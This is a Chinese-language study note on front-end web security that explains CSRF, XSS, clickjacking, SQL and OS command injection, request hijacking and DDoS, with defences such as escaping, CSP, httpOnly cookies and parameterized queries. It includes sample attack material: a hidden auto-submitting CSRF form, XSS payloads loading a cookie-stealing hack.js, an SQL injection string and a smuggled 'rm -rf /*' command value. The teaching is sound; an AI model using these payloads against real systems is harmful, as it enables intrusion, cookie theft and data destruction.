# 前端安全类

- XSS
- CSRF
- 点击劫持 - clickjacking
- sql 注入：使用 parameterized stored procedure
- OS 命令注入
- DDOS
- 请求劫持

## CSRF

cross-site request forgery 跨站请求伪造。危害有：

- 利用用户登录态
- 用户不知情
- 完成业务请求
- 盗取用户资金（转账，消费）
- 冒充用户发帖背锅
- 损害网站声誉

### 原理

1.  用户登录过网站 A
1.  A 网站给用户下发 cookie
1.  用户访问网站 B
1.  B 网站引诱用户点击
1.  用户点击后请求了网站 A 的某个接口，因为 cookie 还在，A 网站认为该登录用户进行了操作，可能添加删除数据

很多年前微博一些大 V 突然同时关注了一些人 就是 csrf 造成的。

 发生前提: 用户登陆过网站 A，用户点击请求时 cookie 有效

```javascript
document.write(`<form method="post" name="commentForm" target="csrf" action="http://loacalhost">
<input type="hidden" name="postId" value="13">
<textarea name="content" >来自csrf</textarea>
</form>`);

var iframe = document.createElement('iframe');
iframe.name = 'csrf';
iframe.style.display = 'none';
document.body.appendChild(iframe);

setTimeout(() => {
  document.querySelector('[name=commentForm]').submit(); //执行在攻击页面该脚本
}, 1000);
```

**防御测试**:

- Token 验证: 访问网站是会主动上传 cookie，但不会主动传 token。访问接口是没有 token 则不予通过验证，或者验证码
- referral 验证:  页面来源是自己站点（同域名）才通过。Https 不发送 referer
- 隐层令牌: 隐藏在 http head 中，类似 token，使用方式有些区别

## XSS

cross-site scripting 跨站脚本攻击。危害如下：

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。

### 原理

不需要登录认证，向页面注入脚本，写入标签，执行有害脚本。可能是评论区添加注入的

### XSS 攻击类型

- 反射型

  URL 参数直接注入。

  ```
  // 普通
  http://localhost:3000/?from=china

  // alert尝试
  http://localhost:3000/?from=<script>alert(3)</script>

  // 获取Cookie
  http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

  // 短域名伪造
  https://dwz.cn/

  // 伪造cookie入侵 chrome
  document.cookie="sid=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxO DYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
  ```

- 存储型

  存储到 DB 后读取时注入。xss 代码会保存到网站的数据中，比如保存到数据库，当其他用户在访问到一篇文章或一个评论时，这段代码会被从数据库中读取取出来，显示在用户页面上。XSS 攻击注入点: **HTML 节点内容、HTML 属性、JavaScript 代码、富文本**

  ```
  // 评论输入框
  <script>alert(1)</script>

  // 跨站脚本注入
  我来了<script src="http://localhost:4000/hack.js"></script>
  ```

### 防御措施

```html
ejs转义小知识: <% code %>用于执行其中javascript代码； <%= code
%>会对code进行html转义；(真实项目用这个去避免发生问题) <%- code %>将不会进行转义
```

让插入的东西无法执行。KBB 编辑器。html escape。

1. 转义`< &lt;` 和 `> &gt`，黑名单，富文本编辑器不能用。更推荐白名单方式

   ```javascript
   var escapeHtml = function(str) {
     if (!str) return '';
     str = str.replace(/</g, '&lt;'); //替换成html实体
     str = str.replace(/>/g, '&gt;');
     return str;
   };
   ```

   - .net 默认开启 XSS 防御，在提交表单的数据时会检测是否有 `<>` 这样危险字符，并自动转义
   - kbb 编辑器

1. 白名单

   ```js
   const xss = require('xss') let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
   // -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
   console.log(html);
   ```

1. 使用 cookie 的 httpOnly 属性。这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。加上了这个属性的 cookie 字段，js 是无法进行读写的

   ```js
   response.addHeader('Set-Cookie', 'uid=112; Path=/; HttpOnly');
   ```

1. 浏览器自带的 XSS 攻击拦截机制:

   设置 `Header X-XSS-Protection`。此机制只适用于参数出现在 HTML 内容或属性才会去拦截。只适用于反射型。并不是所有浏览器都支持

   ```js
   ctx.set('X-XSS-Protection', 0); // 禁止XSS过滤
   ```

   - 0 禁止 XSS 过滤。

   - 1 启用 XSS 过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。

   - 1;mode=block 启用 XSS 过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。

   - 1; report= (Chromium only) 启用 XSS 过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。

1. 新的防御方法-CSP 内容安全策略

该安全策略的实现基于一个称作 `Content-Security-Policy` 的 HTTP 首部。是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

限制规则:

```
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'

// 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*

// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'

child-src: 为 web workers 和其他内嵌浏览器内容定义 合法的源，例如用 <frame> 和 <iframe> 加载到页面的内容。

connect-src: 限制能通过脚本接口加载的URL。

default-src: 为其他取指令提供备用服务 fetch directives.

font-src: 限制通过 @font-face 加载的字体源。

frame-src: 限制通过类似 <frame> 和 <iframe>  标签加载的内嵌内容源。

img-src: 限制图片和图标源

manifest-src: 限制 application manifest 文件源。

media-src: 限制通过 <audio> 或 <video> 标签加载的媒体文件源。

object-src: 限制通过 <object>, <embed>, <applet> 标签加载源。

script-src: 限制 javascript 源。

style-src: 限制层叠样式表文件源。

worker-src: 限制 Worker, SharedWorker, 或者 ServiceWorker 脚本源。
```

指定哪些可信，哪些不可信

- `<host-source><scheme-source>'self'`
- `'unsafe-inline''ubsafe-eval''none'` XSS 攻击重点: 检测页面内容(信任规则)
- `'nonce-<base64-value>' <hash-source>` 一次性凭证 后台 hash 传递
- `'strit-dynamic'` 后续脚本的信任

事例

```js
// koa
ctx.set('Content-Security-Policy', "default-src 'self'");
```

```html
<!-- 在Content中设置规则 -->
<meta http-equiv="Content-Security-Policy" content="default-src https:" />

<!-- 这样设置页面上的脚本会失效，但是外链引用的脚本会有效 -->
<meta http-equiv="Content-Security-Policy" content="default-src self" />

<!-- 但是这样还会导致页面图片失效 因为没有设置相应的'img-src' 规则 ，所以他只会信赖本域下的图片 -->

<!-- 为了更精准的操作防止 XSS 攻击，则采用script-src 这样图片不会受到影响 -->
<meta http-equiv="Content-Security-Policy" content="script-src self" />

<!-- 但是页面上有需要的呢,那就需要设置新规则nonce+随即字符串. nonce+随机🔀字符串 -->
<meta http-equiv="Content-Security-Policy" content="script-src self nonce-1234" />
<script type="text/javascript" nonce="1234"></script>
<!--通过计算页面 hash 值也可以保证界面不受XSS攻击-->
```

## 点击劫持 - clickjacking

点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中， 并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

### 防御

1. X-FRAME-OPTIONS

   X-FRAME-OPTIONS 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御 用 iframe 嵌套的点击劫持攻击。

   该响应头有三个值可选，分别是

   - DENY，表示页面不允许通过 iframe 的方式展示（设置成这个就能阻止）`ctx.set('X-FRAME-OPTIONS', 'DENY')`
   - SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
   - ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示

2. JS 方式

   ```html
   <head>
     <style id="click-jack">
       html {
         display: none !important;
       }
     </style>
     < /head>

     <body>
       <script>
         if (self == top) {
                var style = document.getElementById('click-jack') document.body.removeChild(style)
              } else {
                top.location = self.location
              }
       </script>
     </body>
   </head>
   ```

   以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。

## SQL 注入

```sql
// 填入特殊密码
1'or'1'='1

// 拼接后的SQL
SELECT * FROM test.user WHERE username = 'laowang' AND password = '1'or'1'='1'
```

### 防御

- 所有的查询语句建议使用数据库提供的参数化查询接口，**参数化的语句**使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。

- 严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害

- 后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。
- 对进入数据库的特殊字符（'，"，\，<，>，&，\*，; 等）进行转义处理，或编码转换。基本上所有的后端 语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash.\_escapehtmlchar 库。

## OS 命令注入

OS 命令注入和 SQL 注入差不多，只不过 SQL 注入是针对数据库的，而 OS 命令注入是针对操作系统的。OS 命令注入攻击指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。倘若调用 Shell 时存在疏漏，就可以执行插入的非法命令。

// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的

```js
repo const exec = require('mz/child_process').exec;
let params = {/* 用户输入的参数 */};
exec(`git clone ${params.repo} /some/path`);
```

如果传入的参数是会怎样? `https://github.com/xx/xx.git && rm -rf /* &&`

## 请求劫持

- DNS 劫持: 顾名思义，DNS 服务器(DNS 解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的 ip

- HTTP 劫持: 运营商劫持，此时大概只能升级 HTTPS 了

## DDOS (distributed denial of service)

http://www.ruanyifeng.com/blog/2018/06/ddos.html

DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。

### 常见攻击方式

- SYN Flood: 此攻击通过向目标发送具有欺骗性源 IP 地址的大量 TCP“初始连接请求”SYN 数据包来利用 TCP 握手。目标机器 响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。
- HTTP Flood: 此攻击类似于同时在多个不同计算机上反复按 Web 浏览器中的刷新 - 大量 HTTP 请求泛滥服务器，导致拒绝服 务。

### 防御手段

- 备份网站: 备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网 站出了问题，正在全力抢修。
- HTTP 请求的拦截: 高防 IP 靠谱的运营商 多个 Docker 硬件 服务器 防火墙
- 带宽扩容 + CDN 提高犯罪成本
